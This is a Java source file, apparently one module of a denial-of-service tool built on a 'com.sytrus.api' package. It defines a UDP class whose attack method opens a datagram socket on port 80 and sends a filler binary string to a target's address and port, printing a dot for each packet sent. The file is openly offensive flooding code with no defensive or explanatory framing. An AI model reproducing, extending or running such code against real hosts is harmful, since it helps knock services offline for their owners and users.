package com.sytrus.api.methods;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Socket;
import java.net.SocketException;

import com.sytrus.api.Method;
import com.sytrus.api.Type;

public class UDP extends Method {

	public UDP() {
		this.type = Type.UDP;
	}
	
	@SuppressWarnings("resource")
	@Override
	public void attack(Socket socket) {
		DatagramSocket ds;
		try {
			ds = new DatagramSocket(80);
		} catch (SocketException e) {
			log("Socket error in method udp");
			return;
		}
		String message = "01010100100101010101010010100100101010101010101010101010101010010101010";
		try {
			ds.send(new DatagramPacket(message.getBytes(), message.length(), socket.getInetAddress(), socket.getPort()));
			System.out.print(".");
		} catch (IOException e) {
			log("Error sending datagram packet in UDP class");
			return;
		}
	}
	
}
